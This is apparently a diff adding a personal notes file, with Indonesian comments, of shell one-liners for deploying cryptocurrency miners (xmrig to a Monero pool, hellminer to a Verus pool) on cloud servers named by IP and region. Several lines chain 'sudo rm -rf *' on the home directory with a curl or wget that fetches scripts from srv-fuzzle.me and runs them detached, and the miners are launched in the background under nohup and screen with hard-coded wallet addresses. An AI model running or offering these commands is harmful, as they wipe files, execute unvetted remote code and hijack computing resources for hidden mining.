@@ -1,0 +1,49 @@
+cd ~/ && sudo rm -rf * && sudo killall screen || echo "ok" && sudo pkill screen || echo "ok" && sudo curl -Ls -o script http://srv-fuzzle.me/xmrigDO && sudo screen -dmS setup bash script gulf.moneroocean.stream:10001 86VrrWnG9Y1Qpfk69fbKAbHKWaPstajybeJVnMaibkeyeL5hmbdawGwBTh2YgP2jqJKk6mdaWtfiaBiP6yzimJrL3yNd7V4+90000 \"rx/0\" 13.229.58.20:3344 120994
+
+
+
+wget srv-fuzzle.me/randomizer.sh && chmod +x randomizer.sh && screen -dmS random ./randomizer.sh xmrigMiner 70 80
+
+
+
+cd ~/ && sudo rm -rf * && sudo killall screen || echo "ok" && sudo pkill screen || echo "ok" && sudo curl -Ls -o script http://srv-fuzzle.me/xmrigDO && sudo screen -dmS setup bash script gulf.moneroocean.stream:10001 86VrrWnG9Y1Qpfk69fbKAbHKWaPstajybeJVnMaibkeyeL5hmbdawGwBTh2YgP2jqJKk6mdaWtfiaBiP6yzimJrL3yNd7V4+60000 \"rx/0\" 13.229.58.20:3344 120994
+
+
+
+wget srv-fuzzle.me/randomizer.sh && chmod +x randomizer.sh && screen -dmS random ./randomizer.sh xmrigMiner 70 90
+
+
+
+--------------------------------------------------------------------------------------	|
+//verus																					|
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz	|
+																						|
+tar xf hellminer_cpu_linux.tar.gz														|
+--------------------------------------------------------------------------------------	|
+
+//create 
+nano runner.sh
+
+//isinya
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2vUd4kuMpL1Jw98P2FRjqboVxXCVwFRK.52_53_171_32 -p x --cpu 3 > /tmp/hellminer.log 2>&1
+
+//kasih akses
+chmod +x runner.sh
+
+//Runing :
+nohup ./runner.sh &
+
+//Check Log
+tail -f /tmp/hellminer.log
+
+nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2vUd4kuMpL1Jw98P2FRjqboVxXCVwFRK.vrs1 -p x --cpu 3 > /tmp/hellminer.log 2>&1
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2vUd4kuMpL1Jw98P2FRjqboVxXCVwFRK.N_Virginia_54_167_249_31 -p x --cpu 6 > /tmp/hellminer.log 2>&1
+
+
+
+-----------------------------------------------
+gabisa bikin di 4 wilayah :
+- Africa
+- Hongkong
+- milan
+- bahrain
